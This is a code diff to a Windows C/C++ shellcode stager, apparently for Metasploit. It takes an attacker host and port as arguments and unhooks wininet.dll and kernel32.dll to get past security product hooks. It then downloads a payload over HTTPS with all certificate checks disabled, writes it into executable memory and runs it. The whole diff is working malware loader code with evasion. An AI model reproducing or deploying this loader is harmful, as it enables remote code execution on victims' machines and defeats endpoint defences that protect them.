@@ -2,6 +2,7 @@
 #include <winhttp.h>
 #include <wininet.h>
 #include <stdio.h>
+#include "../Utils/utils.h"
 
 /*
 HINTERNET InternetOpenA(
@@ -90,16 +91,47 @@ LPVOID VirtualAlloc(
 typedef LPVOID(WINAPI* pVirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD fAllocationType, DWORD flProtect);
 
 
-int main()
+int main(int argc, const char* argv[])
 {
-	const char* host = "<changeme>";
-	WORD port = 443;
+	const char* msf_checksum = "HvLrWsodlsuSMpMw-HEe5wmOr1nV_kOATnEi8sn0JbT-yb8lxmbxpyBayQzEk1xUYxbF3H6Up223JLX28xhMipq51Jzj0MuROkkp6eGFvTNZY-hbc9hgsVqpUGCVAAUwIIUv5ow_BoXuQ4HsjrBwCX9iV3pMiVafAjWok02kxI9wakLFnTBgy8Vnr3A5ap3OvzMQdNVKAp3AP2sT08veb";
+	/*
+	#define INTERNET_OPEN_TYPE_PRECONFIG                    0   // use registry configuration
+	#define INTERNET_OPEN_TYPE_DIRECT                       1   // direct to net
+	*/
+	DWORD dwAccessType = 0;
+
+	if (argc < 3)
+	{
+		printf(".exe <host> <port> [<msf checksum>] [<dwAccessType> (0=system proxy | 1=no system proxy)]\n");
+		exit(1);
+	}
+
+	const char* host = static_cast<const char*>(argv[1]);
+	DWORD port = static_cast<DWORD>(std::atoi(argv[2]));
+
+	if (argc == 5)
+	{
+		msf_checksum = static_cast<const char*>(argv[3]);
+		dwAccessType = static_cast<DWORD>(std::atoi(argv[4]));
+		printf("dwAccessType = %d\n", dwAccessType);
+	}
+
+	std::string checksum = "/";
+	checksum += msf_checksum;
 
 	HMODULE wininetdll;
 	HMODULE kernel32dll;
 
-	wininetdll = LoadLibraryA("Wininet");
-	kernel32dll = LoadLibraryA("Kernel32");
+	const char* wininet = "Wininet";
+	const char* kernel32 = "Kernel32";
+
+	LoadLibraryA("wininet"); 
+
+	unhookModule(wininet, "c:\\windows\\system32\\wininet.dll");
+	unhookModule(kernel32, "c:\\windows\\system32\\kernel32.dll");
+
+	wininetdll = GetModuleHandleA(wininet);
+	kernel32dll = GetModuleHandleA(kernel32);
 
 	pVirtualAlloc VirtualAlloc = (pVirtualAlloc)GetProcAddress(kernel32dll, "VirtualAlloc");
 	printf("[*] found VirtualAlloc: 0x%p\n", VirtualAlloc);
@@ -116,43 +148,34 @@ int main()
 	pInternetReadFile InternetReadFile = (pInternetReadFile)GetProcAddress(wininetdll, "InternetReadFile");
 	printf("[*] found InternetReadFile: 0x%p\n", InternetReadFile);
 
-	const char * MSF_CHECKSUM = "/4ULK85uw8Ng8Rz1FVmljOA5pL4K-vfHmdpMBaxmSC79ks6eYLJPIVjYlp7FnOT5yZH9vCHDzSlDh_cf8O7d91xcGg7nWy92ytQd4vHtobk9AROm1rWBOmL8c2dP4DljBnXSa47e4do-RFBa8qC7jNSKLmE-vP7vzPsgFU3bTHdx3jAIr65fHH5LogExlncBSeN_gGoBYkPqZUOjcRh7Tk0c1mbsQt_kLBDaB9zmNzvnVmX50vL92mIZ";
-	
-	__try
+	DWORD securityFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
+	HINTERNET hInternet = InternetOpenA(NULL, dwAccessType, NULL, NULL, 0);
+	HINTERNET hConnect = InternetConnectA(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", checksum.data(), NULL, NULL, NULL,
+		INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_UI, 0);
+	BOOL res = InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));
+	BOOL hFile = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
+
+	SIZE_T memsize = 0x00400000;
+	SIZE_T bytesToRead = 8192;
+	DWORD bytesRead;
+
+	LPVOID memalloc = VirtualAlloc(NULL, memsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	LPVOID expladdr = memalloc;
+	SIZE_T explsize = 0;
+
+	if (InternetReadFile(hRequest, memalloc, bytesToRead, &bytesRead))
 	{
-		DWORD securityFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
-		HINTERNET hInternet = InternetOpenA(NULL, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-		HINTERNET hConnect = InternetConnectA(hInternet, host, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
-		HINTERNET hRequest = HttpOpenRequestA(hConnect, "GET", MSF_CHECKSUM, NULL, NULL, NULL,
-			INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_AUTO_REDIRECT | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_NO_UI, 0);
-		BOOL res = InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &securityFlags, sizeof(securityFlags));
-		BOOL hFile = HttpSendRequestA(hRequest, NULL, 0, NULL, 0);
-
-		SIZE_T memsize = 0x00400000;
-		SIZE_T bytesToRead = 8192;
-		DWORD bytesRead;
-
-		LPVOID memalloc = VirtualAlloc(NULL, memsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-		LPVOID expladdr = memalloc;
-		SIZE_T explsize = 0;
-
-		if (InternetReadFile(hRequest, memalloc, bytesToRead, &bytesRead))
+		while (bytesRead != 0)
 		{
-			while (bytesRead != 0)
-			{
-				explsize = explsize + bytesToRead;
-				memalloc = (char*)memalloc + bytesRead;
-				InternetReadFile(hRequest, memalloc, bytesToRead, &bytesRead);
-			}
+			explsize = explsize + bytesToRead;
+			memalloc = (char*)memalloc + bytesRead;
+			InternetReadFile(hRequest, memalloc, bytesToRead, &bytesRead);
 		}
-		printf("[*] Downloaded %d bytes\n", explsize);
-		printf("[*] Starting expl...\n");
-		((void(*)())expladdr)();
 	}
-	__except(EXCEPTION_EXECUTE_HANDLER)
-	{
-		printf("0x%x\n", GetExceptionCode());
-	}
+	printf("[*] Downloaded %d bytes\n", explsize);
+	printf("[*] Starting expl...\n");
+	((void(*)())expladdr)();
 
 	return 1;
 }
